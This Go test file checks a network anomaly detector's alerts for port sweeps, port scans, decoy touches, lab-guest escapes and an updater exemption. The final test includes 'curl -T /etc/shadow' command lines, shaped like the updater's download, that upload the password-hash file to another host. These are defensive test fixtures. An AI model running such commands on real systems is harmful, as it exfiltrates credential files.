package detector

import (
	"fmt"
	"testing"
	"time"

	"ominull/hub/pkg/storage"
	"ominull/hub/pkg/threatintel"
)

func pagesOf(list []storage.AnomalyAlert) (pages int) {
	for _, a := range list {
		if storage.AlertClass(a) == storage.ClassPage && a.HeldReason == "" {
			pages++
		}
	}
	return pages
}

// A shell's sweep is recorded from its lower threshold on. That record must not
// put the page, which comes at lan_sweep_hosts, behind the sweep cooldown.
func TestARecordedSweepDoesNotHideTheLaterPage(t *testing.T) {
	engine, store := noiseEngine(t)
	now := time.Now().UTC()
	if err := store.UpsertEndpoint(storage.Endpoint{ID: "lap", TenantID: "default", Hostname: "lap", Status: "online", LastSeenAt: now, IP: "10.0.0.11", RoleTag: storage.RolePersonal}); err != nil {
		t.Fatal(err)
	}
	for i := 1; i <= 50; i++ {
		engine.Evaluate(storage.Event{TenantID: "default", EndpointID: "lap", Timestamp: now, Action: "PERMIT", Direction: "OUTBOUND",
			DstIP: fmt.Sprintf("10.0.0.%d", 100+i), DstPort: 8080, ProcessPath: "/usr/bin/python3"})
	}
	got := anomaliesOfType(t, store, "LATERAL_PORT_SWEEP")
	if pagesOf(got) != 1 {
		t.Fatalf("a python sweep of 50 home hosts should page once, got %d pages in %d findings", pagesOf(got), len(got))
	}
}

// A port scan's window can span destinations: it is judged by the worst place
// it reached, not by the last packet's.
func TestAPortScanIsJudgedByEverywhereItReached(t *testing.T) {
	engine, store := noiseEngine(t)
	now := time.Now().UTC()
	if err := store.UpsertEndpoint(storage.Endpoint{ID: "ws", TenantID: "default", Hostname: "ws", Status: "online", LastSeenAt: now, IP: "10.0.0.11", RoleTag: storage.RoleAgent}); err != nil {
		t.Fatal(err)
	}
	flow := func(dst string, port uint16) {
		engine.Evaluate(storage.Event{TenantID: "default", EndpointID: "ws", Timestamp: now, Action: "PERMIT", Direction: "OUTBOUND",
			DstIP: dst, DstPort: port, ProcessPath: "/opt/tools/scanner"})
	}
	for i := 0; i < portSweepPorts-1; i++ {
		flow("10.0.0.77", uint16(2000+i))
	}
	flow("198.51.100.9", 9000)
	got := anomaliesOfType(t, store, "PORT_SCAN_RECON")
	if pagesOf(got) != 1 {
		t.Fatalf("a scan of a home host ending on a public address should page, got %d pages in %d findings: %+v", pagesOf(got), len(got), got)
	}
}

// A page the owner resolved is finished: the same thing happening again is news.
func TestAResolvedPageDoesNotHoldTheNextOne(t *testing.T) {
	engine, store := noiseEngine(t)
	now := time.Now().UTC()
	ep := storage.Endpoint{ID: "lap", TenantID: "default", Hostname: "lap"}
	page := func(id string, at time.Time) storage.AnomalyAlert {
		ev := storage.Event{TenantID: "default", EndpointID: "lap", Timestamp: at, Direction: "OUTBOUND", DstIP: "198.51.100.7", DstPort: 445}
		engine.recordAnomaly(ev, threatintel.GeoRecord{}, ep, storage.AnomalyAlert{ID: id, TenantID: "default", EndpointID: "lap", Hostname: "lap",
			AnomalyType: "DECOY_TOUCH", Severity: "CRITICAL", Title: "decoy", DstIP: ev.DstIP, DstPort: ev.DstPort, Timestamp: at})
		a, err := store.GetAnomalyAlert(id)
		if err != nil {
			t.Fatal(err)
		}
		return a
	}
	first := page("d1", now.Add(-2*time.Hour))
	if first.HeldReason != "" {
		t.Fatalf("first page held: %q", first.HeldReason)
	}
	if again := page("d2", now.Add(-time.Hour)); again.HeldReason != storage.HeldIncident {
		t.Fatalf("a repeat of an open page joins it, held %q", again.HeldReason)
	}
	if err := store.AcknowledgeAnomaly("d1"); err != nil {
		t.Fatal(err)
	}
	if later := page("d3", now); later.HeldReason != "" {
		t.Fatalf("a touch after the page was resolved must push, held %q", later.HeldReason)
	}
}

// An agent runtime seen on a lab guest doesn't stop it being a lab guest.
func TestAnAgentRuntimeDoesNotHideALabEscape(t *testing.T) {
	engine, store := noiseEngine(t)
	now := time.Now().UTC()
	tuning := store.GetDetectionTuning()
	tuning.LabCIDRs = []string{"10.20.0.0/24"}
	if _, err := store.SaveDetectionTuning(tuning, "test"); err != nil {
		t.Fatal(err)
	}
	if err := store.UpsertEndpoint(storage.Endpoint{ID: "guest", TenantID: "default", Hostname: "guest", Status: "online", LastSeenAt: now, IP: "10.20.0.101"}); err != nil {
		t.Fatal(err)
	}
	if _, err := store.DB().Exec(`INSERT INTO agent_egress_runtimes (tenant_id, endpoint_id, runtime, baseline_start) VALUES ('default','guest','claude',?)`, now); err != nil {
		t.Fatal(err)
	}
	engine.Evaluate(storage.Event{TenantID: "default", EndpointID: "guest", Timestamp: now, Action: "PERMIT", Direction: "OUTBOUND",
		DstIP: "10.0.0.77", DstPort: 8080, ProcessPath: "/usr/bin/curl"})
	if got := anomaliesOfType(t, store, "LAB_ESCAPE"); pagesOf(got) != 1 {
		t.Fatalf("lab guest with an agent runtime reaching home: %d pages in %d findings", pagesOf(got), len(got))
	}
}

// The updater exemption is the package download from the hub and nothing else.
func TestTheUpdaterExemptionIsOnlyTheHubDownload(t *testing.T) {
	engine, store := noiseEngine(t)
	engine.SetHubAddress("10.0.0.58")
	now := time.Now().UTC()
	guest := storage.Endpoint{ID: "guest", TenantID: "default", Hostname: "guest", Status: "online", LastSeenAt: now, IP: "10.20.0.101"}
	if err := store.UpsertEndpoint(guest); err != nil {
		t.Fatal(err)
	}
	if err := store.SetEndpointPresence("guest", storage.PresenceParked); err != nil {
		t.Fatal(err)
	}
	run := func(dst string, port uint16, cmd string, at time.Time) {
		engine.Evaluate(storage.Event{TenantID: "default", EndpointID: "guest", Timestamp: at, Action: "PERMIT", Direction: "OUTBOUND",
			DstIP: dst, DstPort: port, ProcessPath: "/usr/bin/curl", CommandLine: cmd, UserIdentity: "root"})
	}
	run("10.0.0.58", 9443, "curl -fsSL --cacert /etc/ominull/ca.crt --proto =https -m 300 -o /var/lib/ominull/updates/agent.deb https://10.0.0.58:9443/download/ominull-agent_1.8.121_amd64.deb", now)
	if got := anomaliesOfType(t, store, "LAB_ESCAPE"); len(got) != 0 {
		t.Fatalf("the real download raised %d", len(got))
	}
	run("10.0.0.77", 8443, "curl -T /etc/shadow -o /var/lib/ominull/updates/agent.deb https://10.0.0.77:8443/", now.Add(time.Second))
	if got := anomaliesOfType(t, store, "LAB_ESCAPE"); pagesOf(got) != 1 {
		t.Fatalf("an upload shaped like the updater to another host: %d pages in %d", pagesOf(got), len(got))
	}
	// Same address and an upload flag: not the updater either.
	ev := storage.Event{DstIP: "10.0.0.58", DstPort: 9443, UserIdentity: "root",
		CommandLine: "curl -T /etc/shadow -o /var/lib/ominull/updates/agent.deb https://10.0.0.58:9443/"}
	if isSensorUpdater(ev, "/usr/bin/curl") {
		t.Fatal("curl -T is an upload")
	}
}
